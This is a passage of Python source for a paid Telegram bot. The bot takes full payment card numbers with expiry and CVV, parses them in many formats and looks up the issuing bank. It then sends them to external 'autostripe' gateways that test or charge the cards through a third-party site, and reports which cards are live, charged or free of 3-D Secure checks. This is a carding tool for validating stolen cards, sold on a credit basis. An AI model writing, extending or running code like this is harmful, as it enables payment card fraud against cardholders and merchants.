<a href='https://t.me/rev3rsex'>💳</a> <b>Please recharge to continue using this service.</b>

<a href='https://t.me/rev3rsex'>📊</a> <b>Current Plan:</b> <code>{user_tier}</code>
<a href='https://t.me/rev3rsex'>💰</a> <b>Credits:</b> <code>0</code>""",
            parse_mode="HTML"
        )
        return
    
    # Create progress message
    progress_msg = f"""<pre>🔄 <b>𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴...</b></pre>
<pre>{card_details}</pre>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↬ <i>𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵</i>"""
    
    # Send the progress message
    checking_message = await update.message.reply_text(progress_msg, parse_mode="HTML")
    
    # Prepare user info
    user_info = {
        "id": user_id,
        "username": username,
        "first_name": first_name
    }
    
    # Update the last command time for Free/Trial users immediately
    if user_tier in ["Trial", "Free"]:
        last_command_time[user_id] = current_time
    
    # Create a background task for the card check to avoid blocking
    async def background_check():
        try:
            # Run the asynchronous card check with Stripe Auth API
            result = await check_card_with_stripe_auth(card_details, user_info)
            
            # Format the response using format_response_stripe_auth function
            formatted_response, _ = au_format_response_stripe_auth(result, user_info)
            
            # Deduct 1 credit if the response was successful and user doesn't have unlimited credits
            if result and not result.get("error") and not is_unlimited:
                # Deduct 1 credit in the background
                update_user_credits(user_id, -1)
                
                # Get updated credits for the response
                updated_credits = get_user_credits(user_id)
                
                # Add warning if credits are now 0
                if updated_credits is not None and updated_credits <= 0:
                    # Add warning message at the end of the result
                    formatted_response = formatted_response + f"\n\n<a href='https://t.me/rev3rsex'>⚠️</a> <b>𝙒𝙖𝙧𝙣𝙞𝙣𝙜:</b> <i>You have 0 credits left. Please recharge to continue using this service.</i>"
            
            # Edit the checking message with the result
            await checking_message.edit_text(formatted_response, parse_mode="HTML")
        except Exception:
            logger.error("Error in background check")
            error_msg = f"""<a href='https://t.me/rev3rsex'>⚠️</a> <b>𝙀𝙧𝙧𝙤𝙧 𝘿𝙪𝙧𝙞𝙣𝙜 𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜</b>

<a href='https://t.me/rev3rsex'>📝</a> <b>𝘿𝙚𝙩𝙖𝙞𝙡𝙨:</b> <code>An unexpected error occurred</code>

<a href='https://t.me/rev3rsex'>💡</a> <b>𝙎𝙪𝙜𝙜𝙚𝙨𝙩𝙞𝙤𝙣:</b> <i>Please try again later.</i>"""
            await checking_message.edit_text(error_msg, parse_mode="HTML")
    
    # Schedule the background task without awaiting it to avoid blocking
    asyncio.create_task(background_check())



# ============================================================
# MODULE: vbv
# ============================================================
# Configure logging

# API endpoint
API_URL = VBV_API_URL
API_KEY = "rockysoon"

# Create a thread pool executor for background tasks
executor = ThreadPoolExecutor(max_workers=100)

# Dictionary to store last command time for each user (for cooldown)
last_command_time = {}

# Semaphore to limit concurrent API requests
MAX_CONCURRENT_REQUESTS = 5
request_semaphore = asyncio.Semaphore(MAX_CONCURRENT_REQUESTS)

def vbv_parse_card_details(card_string: str) -> Optional[Tuple[str, str, str, str]]:
    """
    Parse card details from various formats.
    
    Args:
        card_string: String containing card details in various formats
        
    Returns:
        Tuple of (card_number, month, year, cvv) or None if parsing failed
    """
    # Remove any extra spaces
    card_string = card_string.strip()
    
    # Try different patterns
    patterns = [
        # Pattern: 4296190000711410|08|30|545
        r'^(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4296190000711410/08/30/545
        r'^(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        # Pattern: 4296190000711410:08:30:545
        r'^(\d{13,19}):(\d{1,2}):(\d{2,4}):(\d{3,4})$',
        # Pattern: 4296190000711410/08|30|545
        r'^(\d{13,19})\/(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4296190000711410:08:30:545
        r'^(\d{13,19})\|(\d{1,2}):(\d{2,4}):(\d{3,4})$',
        # Pattern: 4296190000711410:08:30:545
        r'^(\d{13,19})\|(\d{1,2}):(\d{2,4}):(\d{3,4})$',
        # Pattern: 4296190000711410|08:30:545
        r'^(\d{13,19})\|(\d{1,2}):(\d{2,4}):(\d{3,4})$',
        # Pattern: 4296190000711410|08:30:545
        r'^(\d{13,19})\|(\d{1,2}):(\d{2,4}):(\d{3,4})$',
        # Pattern: 4296190000711410 08 30 545
        r'^(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})$',
    ]
    
    for pattern in patterns:
        match = re.match(pattern, card_string)
        if match:
            card_number, month, year, cvv = match.groups()
            
            # Normalize month (ensure it's 2 digits)
            month = month.zfill(2)
            
            # Normalize year (if it's 4 digits, take last 2)
            if len(year) == 4:
                year = year[2:]
            
            return card_number, month, year, cvv
    
    return None

async def vbv_check_card(card_details: str, user_info: Dict) -> Optional[str]:
    """
    Check card details using VBV API asynchronously with aiohttp.
    
    Args:
        card_details: String containing card details in various formats
        user_info: Dictionary containing user information
        
    Returns:
        Formatted response string or None if there was an error
    """
    # Parse card details
    parsed = vbv_parse_card_details(card_details)
    if not parsed:
        return "⚠️ <b>Missing card details!</b>\n\n<i>Usage: /vbv card|mm|yy|cvv</i>"
    
    card_number, month, year, cvv = parsed
    
    # Get BIN information using the imported function
    bin_number = card_number[:6]
    try:
        bin_details = await get_bin_info(bin_number)
        brand = (bin_details.get("scheme") or "N/A").title()
        issuer = bin_details.get("bank") or "N/A"
        country_name = bin_details.get("country") or "Unknown"
        country_flag = bin_details.get("country_emoji", "")
    except Exception as e:
        logger.error(f"Error getting BIN info: {str(e)}")
        brand = "N/A"
        issuer = "N/A"
        country_name = "Unknown"
        country_flag = ""
    
    cc_string = f"{card_number}|{month}|{year}|{cvv}"
    api_url = f"{API_URL}/gateway=autostripe/key=Blackxcard/site=kabusvuya.com/cc={cc_string}"
    
    # Use semaphore to limit concurrent requests
    async with request_semaphore:
        try:
            timeout = aiohttp.ClientTimeout(total=30)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                async with session.get(api_url, headers={"User-Agent": "Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36"}) as response:
                    # Check if the request was successful
                    if response.status == 200:
                        api_response = await response.json()
                        logger.info(f"API Response for card {card_number[:6]}******: {json.dumps(api_response)}")
                    else:
                        error_text = await response.text()
                        logger.error(f"API returned status {response.status}: {error_text}")
                        return f"⚠️ <b>API Error:</b> <code>Server returned status {response.status}</code>"
            
            # Format and return the response
            return vbv_format_response(api_response, user_info, card_details, brand, issuer, country_name, country_flag)
        
        except asyncio.TimeoutError:
            logger.error(f"Timeout checking card {card_number[:6]}******")
            return f"⚠️ <b>Timeout:</b> <code>Request timed out. Please try again.</code>"
        except json.JSONDecodeError:
            logger.error(f"Invalid JSON response for card {card_number[:6]}******")
            return f"⚠️ <b>API Error:</b> <code>Invalid response from server</code>"
        except Exception as e:
            logger.error(f"Error checking card: {str(e)}")
            return f"⚠️ <b>Error checking card:</b> <code>{str(e)}</code>"

def vbv_format_response(api_response: Dict, user_info: Dict, card_details: str, 
                   brand: str, issuer: str, country_name: str, country_flag: str) -> str:
    """
    Format the API response into a beautiful message with emojis.
    
    Args:
        api_response: Dictionary containing the API response
        user_info: Dictionary containing user information
        card_details: Full card details string
        brand: Card brand from BIN lookup
        issuer: Bank name from BIN lookup
        country_name: Country name from BIN lookup
        country_flag: Country emoji from BIN lookup
        
    Returns:
        Formatted string with emojis
    """
    response_text = api_response.get("response", api_response.get("message", "N/A"))
    bin_info = api_response.get("bin", "N/A")
    
    bin_found = api_response.get("bin_found", False)
    
    # Parse and clean the response message
    response_text = response_text.replace("\\", "").replace("/", "").replace("\"", "").replace("'", "")
    
    # Determine status based on message content with stylish formatting
    status_emoji = "❓"
    status_text = "Unknown"
    status_style = ""
    
    # Check for success messages
    if "successful" in response_text.lower() or "non vbv" in response_text.lower() or "no 3d" in response_text.lower():
        status_emoji = "✅"
        status_text = "Non VBV"
        status_style = "<b>𝐍𝐨𝐧 𝐕𝐁𝐕</b> ✅"
    # Check for VBV/MSC messages
    elif "vbv" in response_text.lower() or "3d" in response_text.lower() or "msc" in response_text.lower():
        status_emoji = "❌"
        status_text = "VBV Required"
        status_style = "<b>𝐕𝐁𝐕 𝐑𝐞𝐪𝐮𝐢𝐫𝐞𝐝</b> ❌"
    # Check for challenge required messages
    elif "challenge" in response_text.lower():
        status_emoji = "❌"
        status_text = "Declined"
        status_style = "<b>𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝</b> ❌"
    # Handle case when BIN is not found in database
    elif not bin_found:
        status_emoji = "❌"
        status_text = "Declined"
        status_style = "<b>𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝</b> ❌"
    # Default status
    else:
        status_emoji = "❓"
        status_text = "Unknown"
        status_style = "<b>𝐔𝐧𝐤𝐧𝐨𝐰𝐧</b> ❓"
    
    # Get user info
    user_id = user_info.get("id", "Unknown")
    username = user_info.get("username", "")
    first_name = html.escape(user_info.get("first_name", "User"))
    
    # Get user tier from plans module
    user_tier = get_user_current_tier(user_id)
    
    # Get user credits and format display
    user_credits = get_user_credits(user_id)
    if user_credits is None:
        credits_display = "Error"
    elif user_credits == float('inf'):
        credits_display = "Infinite😎"  # Display for unlimited credits
    else:
        credits_display = str(user_credits)

    # Create user link with profile name hyperlinked (as requested)
    user_link = f"<a href='tg://user?id={user_id}'>{first_name}</a> <code>[{user_tier}]</code>"
    
    # Format the response with the exact structure requested
    status_part = f"""<pre><a href='https://t.me/+7x_7DZGSDCs1ZDBl'>⩙</a> <b>𝑺𝒕𝒂𝒕𝒖𝒔</b> ↬ {status_style}</pre>"""
    
    bank_part = f"""<pre><b>𝑩𝒔𝒂𝒎𝒌</b> ↬ <code>{brand}</code>
<b>𝑩𝒂𝒏𝒌</b> ↬ <code>{issuer}</code>
<b>𝑪𝒐𝒖𝒏𝒕𝒓𝒚</b> ↬ <code>{country_name} {country_flag}</code></pre>"""
    
    card_part = f"""<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐂𝐚𝐫𝐝</b>
⤷ <code>{card_details}</code>"""
    
    # Add credits info only if user has 0 credits and not unlimited
    credits_warning = ""
    if user_credits is not None and user_credits <= 0 and user_credits != float('inf'):
        credits_warning = f"\n<a href='https://t.me/rev3rsex'>⚠️</a> <b>𝙇𝙤𝙬𝙠𝙚𝙙𝙞𝙣𝙜:</b> <i>You have 0 credits left. Please recharge to continue using this service.</i>"
    
    # Combine all parts
    formatted_response = f"""{status_part}
{card_part}
<a href='https://t.me/+7x_7DZGSDCs1ZDBl'>⊀</a> <b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲</b> ↬ <i>𝟯𝗗𝗦 𝗟𝗼𝗼𝗸𝘂𝗽</i>
<a href='https://t.me/+7x_7DZGSDCs1ZDBl'>⊀</a> <b>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞</b> ↬ <code>{response_text}</code>
{bank_part}
<a href='https://t.me/+7x_7DZGSDCs1ZDBl'>⊀</a> <b>𝐔𝐬𝐞𝐫</b> ↬ {user_link} 
<a href='https://t.me/+7x_7DZGSDCs1ZDBl'>⊀</a> <b>𝐃𝐞𝐯</b> ↬ <a href='https://t.me/rev3rsex'>@rev3rsex</a>"""
    
    return formatted_response + credits_warning

# This function will be called from main.py
async def handle_vbv_command(update, context):
    """
    Handle the /vbv command with user-specific cooldown for Trial users.
    
    Args:
        update: Telegram update object
        context: Telegram context object
    """
    # Get user info
    user_id = update.effective_user.id
    username = update.effective_user.username
    first_name = update.effective_user.first_name
    
    # Get user tier from plans module
    user_tier = get_user_current_tier(user_id)
    
    # Check cooldown for Trial users (user-specific)
    current_time = datetime.now()
    if user_tier == "Trial" and user_id in last_command_time:
        time_diff = current_time - last_command_time[user_id]
        if time_diff < timedelta(seconds=10):
            remaining_seconds = 10 - int(time_diff.total_seconds())
            await update.message.reply_text(
                f"⏳ <b>Please wait {remaining_seconds} seconds before using this command again.</b>\n\n"
                f"<i>Upgrade your plan to remove the time limit.</i>",
                parse_mode="HTML"
            )
            return
    
    # Get the card details from the command
    if not context.args:
        await update.message.reply_text("⚠️ <b>Missing card details!</b>\n\n<i>Usage: /vbv card|mm|yy|cvv</i>", parse_mode="HTML")
        return
    
    card_details = " ".join(context.args)
    
    # Get user credits
    user_credits = get_user_credits(user_id)
    
    # Check if user has enough credits (or unlimited)
    is_unlimited = user_credits == float('inf')
    has_credits = user_credits is not None and (is_unlimited or user_credits > 0)
    
    if not has_credits:
        # Still allow the request but show a warning
        progress_msg = f"""<pre>🔄 <b>𝗣𝗿𝗼𝗰𝗲𝘀𝗶𝗻𝗴 𝗥𝗲𝗾𝗲𝘀𝘁...</b></pre>
<pre>{card_details}</pre>
Gateway: <i>VBV Check</i>
<a href='https://t.me/rev3rsex'>⚠️</a> <b>𝙇𝙚𝙬𝙠𝙚𝙙𝙞𝙣𝙜:</b> <i>You have 0 credits left. This will be your last check.</i>"""
    else:
        # Create a normal progress message without credit info
        progress_msg = f"""<pre>🔄 <b>𝗣𝗿𝗼𝗰𝗲𝘀𝗶𝗻𝗴 𝗥𝗲𝗾𝗲𝘀𝘁...</b></pre>
<pre>{card_details}</pre>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↬ <i>𝟯𝗗𝗦 𝗟𝗼𝗼𝗸𝘂𝗽</i>"""
    
    # Send the progress message
    checking_message = await update.message.reply_text(progress_msg, parse_mode="HTML")
    
    # Prepare user info
    user_info = {
        "id": user_id,
        "username": username,
        "first_name": first_name
    }
    
    # Update the last command time for Trial users immediately
    if user_tier == "Trial":
        last_command_time[user_id] = current_time
    
    # Create a background task for the card check to avoid blocking
    async def background_check():
        try:
            # Run the asynchronous card check
            result = await vbv_check_card(card_details, user_info)
            
            # Deduct 1 credit if the response was successful and user doesn't have unlimited credits
            if result and not result.startswith("⚠️ <b>Missing card details!</b>") and not result.startswith("⚠️ <b>Error checking card:</b>"):
                # Only deduct credits if the user doesn't have unlimited
                if not is_unlimited:
                    # Deduct 1 credit in the background
                    update_user_credits(user_id, -1)
                    
                    # Get updated credits for the response
                    updated_credits = get_user_credits(user_id)
                    
                    # Add warning if credits are now 0
                    if updated_credits is not None and updated_credits <= 0:
                        # Add warning message at the end of the result
                        result = result + f"\n<a href='https://t.me/rev3rsex'>⚠️</a> <b>𝙇𝙚𝙬𝙠𝙚𝙙𝙞𝙣𝙜:</b> <i>You have 0 credits left. Please recharge to continue using this service.</i>"
            
            # Edit the checking message with the result
            try:
                await checking_message.edit_text(result, parse_mode="HTML")
            except Exception as e:
                logger.error(f"Error editing message: {str(e)}")
                # If editing fails, try sending a new message
                await update.message.reply_text(result, parse_mode="HTML")
        except Exception as e:
            logger.error(f"Error in background check: {e}")
            error_msg = f"⚠️ <b>Error:</b> <code>{str(e)}</code>"
            try:
                await checking_message.edit_text(error_msg, parse_mode="HTML")
            except Exception as e:
                logger.error(f"Error editing error message: {str(e)}")
                # If editing fails, try sending a new message
                await update.message.reply_text(error_msg, parse_mode="HTML")
    
    # Schedule the background task without awaiting it
    asyncio.create_task(background_check())



# ============================================================
# MODULE: st
# ============================================================
# Configure logging

# API endpoint
API_BASE_URL = STRIPE_API_URL

# Create a thread pool executor for background tasks
executor = ThreadPoolExecutor(max_workers=100)

# Dictionary to store last command time for each user (for cooldown)
last_command_time = {}

# Dictionary to track active requests per user (REMOVED as per request to allow multiple concurrent requests)

def st_parse_card_details(card_string: str) -> Optional[Tuple[str, str, str, str]]:
    """
    Parse card details from various formats.
    
    Args:
        card_string: String containing card details in various formats
        
    Returns:
        Tuple of (card_number, month, year, cvv) or None if parsing failed
    """
    # Remove any extra spaces
    card_string = card_string.strip()
    
    # Try different patterns
    patterns = [
        # Pattern: 4296190000711410|08|30|545
        r'^(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4296190000711410/08/30/545
        r'^(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        # Pattern: 4296190000711410:08:30:545
        r'^(\d{13,19}):(\d{1,2}):(\d{2,4}):(\d{3,4})$',
        # Pattern: 4296190000711410/08|30|545
        r'^(\d{13,19})\/(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4296190000711410|08/30/545
        r'^(\d{13,19})\|(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        # Pattern: 4296190000711410:08|30|545
        r'^(\d{13,19}):(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4296190000711410|08:30:545
        r'^(\d{13,19})\|(\d{1,2}):(\d{2,4}):(\d{3,4})$',
        # Pattern: 4296190000711410 08 30 545
        r'^(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})$',
        # Pattern: 4169161410569379/12|16|931
        r'^(\d{13,19})\/(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4169161410569379/12|16/931
        r'^(\d{13,19})\/(\d{1,2})\|(\d{2,4})\/(\d{3,4})$',
        # Pattern: 4169161410569379/12/16/931
        r'^(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        # Pattern: 4169161410569379|12/16|931
        r'^(\d{13,19})\|(\d{1,2})\/(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4169161410569379|12/16/931
        r'^(\d{13,19})\|(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        # Pattern: 4169161410569379:12|16|931
        r'^(\d{13,19}):(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4169161410569379:12|16/931
        r'^(\d{13,19}):(\d{1,2})\|(\d{2,4})\/(\d{3,4})$',
        # Pattern: 4169161410569379:12/16|931
        r'^(\d{13,19}):(\d{1,2})\/(\d{2,4})\|(\d{3,4})$',
    ]
    
    for pattern in patterns:
        match = re.match(pattern, card_string)
        if match:
            card_number, month, year, cvv = match.groups()
            
            # Normalize month (ensure it's 2 digits)
            month = month.zfill(2)
            
            # Normalize year (if it's 4 digits, take last 2)
            if len(year) == 4:
                year = year[2:]
            
            return card_number, month, year, cvv
    
    return None

def st_extract_card_from_text(text: str) -> Optional[str]:
    """
    Extract card details from a text message using various patterns.
    
    Args:
        text: The text to search for card details
        
    Returns:
        String containing card details in format "card|mm|yy|cvv" or None if not found
    """
    # Patterns to find card details in any text
    patterns = [
        # Pattern: 4296190000711410|08|30|545
        r'(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
        # Pattern: 4296190000711410/08/30/545
        r'(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})',
        # Pattern: 4296190000711410:08:30:545
        r'(\d{13,19}):(\d{1,2}):(\d{2,4}):(\d{3,4})',
        # Pattern: 4296190000711410/08|30|545
        r'(\d{13,19})\/(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
        # Pattern: 4296190000711410|08/30/545
        r'(\d{13,19})\|(\d{1,2})\/(\d{2,4})\/(\d{3,4})',
        # Pattern: 4296190000711410:08|30|545
        r'(\d{13,19}):(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
        # Pattern: 4296190000711410|08:30:545
        r'(\d{13,19})\|(\d{1,2}):(\d{2,4}):(\d{3,4})',
        # Pattern: 4296190000711410 08 30 545
        r'(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})',
        # Pattern: 4169161410569379/12|16|931
        r'(\d{13,19})\/(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
        # Pattern: 4169161410569379/12|16/931
        r'(\d{13,19})\/(\d{1,2})\|(\d{2,4})\/(\d{3,4})',
        # Pattern: 4169161410569379/12/16/931
        r'(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})',
        # Pattern: 4169161410569379|12/16|931
        r'(\d{13,19})\|(\d{1,2})\/(\d{2,4})\|(\d{3,4})',
        # Pattern: 4169161410569379|12/16/931
        r'(\d{13,19})\|(\d{1,2})\/(\d{2,4})\/(\d{3,4})',
        # Pattern: 4169161410569379:12|16|931
        r'(\d{13,19}):(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
        # Pattern: 4169161410569379:12|16/931
        r'(\d{13,19}):(\d{1,2})\|(\d{2,4})\/(\d{3,4})',
        # Pattern: 4169161410569379:12/16|931
        r'(\d{13,19}):(\d{1,2})\/(\d{2,4})\|(\d{3,4})',
    ]
    
    for pattern in patterns:
        match = re.search(pattern, text)
        if match:
            card_number, month, year, cvv = match.groups()
            
            # Normalize month (ensure it's 2 digits)
            month = month.zfill(2)
            
            # Normalize year (if it's 4 digits, take last 2)
            if len(year) == 4:
                year = year[2:]
            
            return f"{card_number}|{month}|{year}|{cvv}"
    
    return None

async def st_check_card(card_details: str, user_info: Dict) -> Optional[str]:
    """
    Check card details using Stripe 0.50$ API asynchronously with aiohttp.
    Updated to parse API response: {"status": "...", "message": "...", "decline_code": "..."}
    
    Args:
        card_details: String containing card details in various formats
        user_info: Dictionary containing user information
        
    Returns:
        Formatted response string or None if there was an error
    """
    # Parse card details
    parsed = st_parse_card_details(card_details)
    if not parsed:
        return "⚠️ <b>Missing card details!</b>\n\n<i>Usage: /st card|mm|yy|cvv</i>"
    
    card_number, month, year, cvv = parsed
    
    # Get BIN information using the imported function
    bin_number = card_number[:6]
    bin_details = await get_bin_info(bin_number)
    brand = (bin_details.get("scheme") or "N/A").title()
    issuer = bin_details.get("bank") or "N/A"
    country_name = bin_details.get("country") or "Unknown"
    country_flag = bin_details.get("country_emoji", "")
    
    # Construct the card string for the API
    card_string = f"{card_number}|{month}|{year}|{cvv}"
    
    # Construct the API URL
    api_url = f"{API_BASE_URL}/gateway=autostripe/key=Blackxcard/site=kabusvuya.com/cc={card_string}"
    
    try:
        # Create an aiohttp session for async HTTP requests
        async with aiohttp.ClientSession() as session:
            # Make API request asynchronously
            async with session.get(api_url, headers={"User-Agent": "Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36"}, timeout=aiohttp.ClientTimeout(total=60)) as response:
                # Get the response status code
                status_code = response.status
                
                # Try to parse as JSON, but handle cases where it's not valid JSON
                try:
                    api_response = await response.json()
                except:
                    # If it's not valid JSON, try to get text
                    response_text = await response.text()
                    api_response = {
                        "status": "Error",
                        "message": response_text,
                        "decline_code": "unknown"
                    }
        
        # --- Updated Response Processing Logic ---
        
        # Extract fields from the new API structure safely
        # Expected format: {"status": "Charged/Approved/Declined", "message": "...", "decline_code": "..."}
        
        status_val = str(api_response.get("status", "Unknown")).lower()
        msg_val = api_response.get("response", api_response.get("message", "N/A"))
        decline_code_val = api_response.get("decline_code", "N/A")
        
        # Construct the formatted response string: Message (Decline Code)
        # Example: "Your payment was successful (succeeded)"
        formatted_api_response = f"{msg_val} ({decline_code_val})"
        
        # Determine Status Text and Emoji based on API Status
        if "charged" in status_val or "success" in status_val or "captured" in status_val:
            status_text = "𝘾𝙝𝙖𝙧𝙜𝙚𝙙"
            status_emoji = "🔥"
        elif "approved" in status_val:
            status_text = "𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙"
            status_emoji = "🟢"
        elif "declined" in status_val:
            status_text = "𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙"
            status_emoji = "❌"
        else:
            status_text = "𝙀𝙧𝙧𝙤𝙧"
            status_emoji = "⚠️"
            
        # Format and return the final response
        return st_format_response(formatted_api_response, user_info, card_details, brand, issuer, country_name, country_flag, status_text, status_emoji)
    
    except Exception as e:
        logger.error(f"Error checking card: {e}")
        return f"⚠️ <b>Error checking card:</b> <code>{str(e)}</code>"
        

def st_format_response(api_response: str, user_info: Dict, card_details: str, 
                   brand: str, issuer: str, country_name: str, country_flag: str,
                   status_text: str, status_emoji: str) -> str:
    """
    Format the API response into a beautiful message with emojis.
    
    Args:
        api_response: The formatted response string from the API
        user_info: Dictionary containing user information
        card_details: Full card details string
        brand: Card brand from BIN lookup
        issuer: Bank name from BIN lookup
        country_name: Country name from BIN lookup
        country_flag: Country emoji from BIN lookup
        status_text: The determined status text (e.g., "𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙")
        status_emoji: The emoji for the status (e.g., "❌")
        
    Returns:
        Formatted string with emojis
    """
    
    # Get user info
    user_id = user_info.get("id", "Unknown")
    username = user_info.get("username", "")
    first_name = html.escape(user_info.get("first_name", "User"))
    
    # Get user tier from plans module
    user_tier = get_user_current_tier(user_id)
    
    # Get user credits and format display
    user_credits = get_user_credits(user_id)
    if user_credits is None:
        credits_display = "Error"
    elif user_credits == float('inf'):
        credits_display = "Infinite😎"
    else:
        credits_display = str(user_credits)

    # Create user link with profile name hyperlinked
    user_link = f"<a href='tg://user?id={user_id}'>{first_name}</a> <code>[{user_tier}]</code>"
    
    # Format the response with the exact structure requested
    status_part = f"""<pre><a href='https://t.me/rev3rsex'>⩙</a> <b>𝑺𝒕𝒂𝒕𝒖𝒔</b> ↬ <b>{status_text}</b> {status_emoji}</pre>"""
    
    bank_part = f"""<pre><b>𝑩𝒓𝒂𝒏𝒅</b> ↬ <code>{brand}</code>
<b>𝑩𝒂𝒏𝒌</b> ↬ <code>{issuer}</code>
<b>𝑪𝒐𝒖𝒏𝒕𝒓𝒚</b> ↬ <code>{country_name} {country_flag}</code></pre>"""
    
    card_part = f"""<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐂𝐚𝐫𝐝</b>
⤷ <code>{card_details}</code>"""
    
    # Add credits info only if user has 0 credits and not unlimited
    credits_warning = ""
    if user_credits is not None and user_credits <= 0 and user_credits != float('inf'):
        credits_warning = f"\n<a href='https://t.me/rev3rsex'>⚠️</a> <b>𝙒𝙖𝙧𝙣𝙞𝙣𝙜:</b> <i>You have 0 credits left. Please recharge to continue using this service.</i>"
    
    # Combine all parts
    formatted_response = f"""{status_part}
{card_part}
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲</b> ↬ <i>𝗦𝘁𝗿𝗶𝗽𝗲 0.50$</i>
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞</b> ↬ <code>{api_response}</code>
{bank_part}
<a href='https://t.me/rev3rsex'>⌬</a> <b>𝐔𝐬𝐞𝐫</b> ↬ {user_link} 
<a href='https://t.me/rev3rsex'>⌬</a> <b>𝐃𝐞𝐯</b> ↬ <a href='https://t.me/rev3rsex'>@rev3rsex</a>"""
    
    return formatted_response

# This function will be called from main.py
async def handle_st_command(update, context):
    """
    Handle the /st command.
    Updated cooldown logic: 
    - Trial users: 10 seconds gap.
    - Active plan users: No time limit (can run multiple concurrently).
    - Removed "wait for previous request" check to allow concurrency.
    """
    # Get user info
    user_id = update.effective_user.id
    username = update.effective_user.username
    first_name = update.effective_user.first_name
    
    # Get user tier from plans module
    user_tier = get_user_current_tier(user_id)
    
    # Removed active_requests blocking logic to allow concurrent requests
    
    # Determine cooldown based on tier
    cooldown_seconds = 0
    if user_tier == "Trial":
        cooldown_seconds = 10
    # For active plans, cooldown remains 0
    
    # Check cooldown for Trial users (or specific tier logic)
    current_time = datetime.now()
    if cooldown_seconds > 0 and user_id in last_command_time:
        time_diff = current_time - last_command_time[user_id]
        if time_diff < timedelta(seconds=cooldown_seconds):
            remaining_seconds = cooldown_seconds - int(time_diff.total_seconds())
            await update.message.reply_text(
                f"⏳ <b>Please wait {remaining_seconds} seconds before using this command again.</b>\n\n"
                f"<i>Upgrade your plan to remove the time limit.</i>",
                parse_mode="HTML"
            )
            return
    
    # Try to get card details from command arguments
    card_details = None
    
    # First check if arguments are provided
    if context.args:
        card_details = " ".join(context.args)
    # If no arguments, check if this is a reply to a message
    elif update.message.reply_to_message:
        # Try to extract card details from the replied message
        replied_text = update.message.reply_to_message.text or update.message.reply_to_message.caption or ""
        card_details = st_extract_card_from_text(replied_text)
    
    # If still no card details, show usage
    if not card_details:
        await update.message.reply_text(
            "⚠️ <b>Missing card details!</b>\n\n"
            "<i>Usage 1: /st card|mm|yy|cvv</i>\n"
            "<i>Usage 2: Reply to a message containing card details with /st</i>", 
            parse_mode="HTML"
        )
        return
    
    # Get user credits
    user_credits = get_user_credits(user_id)
    
    # Check if user has enough credits (or unlimited)
    is_unlimited = user_credits == float('inf')
    has_credits = user_credits is not None and (is_unlimited or user_credits > 0)
    
    # If user has no credits, don't process the card check
    if not has_credits:
        await update.message.reply_text(
            f"<a href='https://t.me/rev3rsex'>⚠️</a> <b>𝙄𝙣𝙨𝙪𝙛𝙛𝙞𝙘𝙞𝙚𝙣𝙩 𝘾𝙧𝙚𝙙𝙞𝙩𝙨:</b>\n\n"
            f"<i>You have 0 credits left. Please recharge to continue using this service.</i>\n\n"
            f"<b>Current Tier:</b> <code>{user_tier}</code>",
            parse_mode="HTML"
        )
        return
    
    # Update the last command time immediately (before starting request)
    last_command_time[user_id] = current_time
    
    # Create a progress message
    progress_msg = f"""<pre>🔄 <b>𝗣𝗿𝗼𝗰𝗲𝘀𝗶𝗻𝗴 𝗥𝗲𝗾𝘂𝗲𝘀𝘁...</b></pre>
<pre>{card_details}</pre>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↬ <i>𝗦𝘁𝗿𝗶𝗽𝗲 0.50$</i>"""
    
    # Send the progress message
    checking_message = await update.message.reply_text(progress_msg, parse_mode="HTML")
    
    # Removed active_requests[user_id] = True
    
    # Prepare user info
    user_info = {
        "id": user_id,
        "username": username,
        "first_name": first_name
    }
    
    # Create a background task for the card check to avoid blocking
    async def background_check():
        try:
            # Run the asynchronous card check
            result = await st_check_card(card_details, user_info)
            
